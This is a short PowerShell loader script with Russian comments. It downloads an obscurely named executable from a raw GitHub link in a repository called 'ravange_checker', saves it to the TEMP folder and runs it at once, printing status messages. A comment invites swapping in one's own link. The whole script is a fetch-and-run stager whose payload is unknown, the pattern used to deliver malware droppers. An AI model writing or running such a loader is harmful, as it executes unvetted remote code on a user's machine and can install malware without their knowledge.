# === Загрузчик для G8cNx8ED.iLT.exe ===

Write-Host "[+] Загрузчик запущен..." -ForegroundColor Green

# Ссылка на ваш файл (замените на свою raw-ссылку)
$exeUrl = "https://github.com/feG700/ravange_checker/raw/refs/heads/main/G8cNx8ED.iLT.exe"
$exePath = "$env:TEMP\G8cNx8ED.iLT.exe"

try {
    irm -Uri $exeUrl -OutFile $exePath
    Write-Host "[+] Файл успешно скачан" -ForegroundColor Cyan
    
    Start-Process -FilePath $exePath
    Write-Host "[+] Файл запущен!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка: $($_.Exception.Message)" -ForegroundColor Red
}
